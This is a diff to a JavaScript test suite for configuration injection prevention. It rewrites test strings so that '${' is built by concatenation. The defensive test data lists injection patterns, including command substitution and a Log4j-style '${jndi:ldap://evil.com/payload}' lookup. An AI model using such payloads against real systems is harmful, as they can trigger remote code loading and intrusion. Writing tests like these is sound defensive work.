@@ -551,14 +551,14 @@ describe('Secure Configuration Patterns', () => {
   describe('Configuration Injection Prevention', () => {
     it('should prevent environment variable injection attacks', async () => {
       const injectionPatterns = [
-        '${OTHER_VAR}',
+        '$' + '{OTHER_VAR}',
         '$(command)',
         '`command`',
         '$((2+2))',
         '#{variable}',
         '%{variable}',
         '{{variable}}',
-        '${jndi:ldap://evil.com/payload}', // Log4j style
+        '$' + '{jndi:ldap://evil.com/payload}', // Log4j style
       ]
 
       for (const pattern of injectionPatterns) {
@@ -758,7 +758,7 @@ describe('Secure Configuration Patterns', () => {
         },
         {
           name: 'Variable expansion',
-          payload: '${DATABASE_URL}',
+          payload: '$' + '{DATABASE_URL}',
           expected: 'literal string, not expanded',
         },
         {
@@ -768,7 +768,7 @@ describe('Secure Configuration Patterns', () => {
         },
         {
           name: 'Log4j style injection',
-          payload: '${jndi:ldap://evil.com/payload}',
+          payload: '$' + '{jndi:ldap://evil.com/payload}',
           expected: 'literal string, not JNDI lookup',
         },
       ]
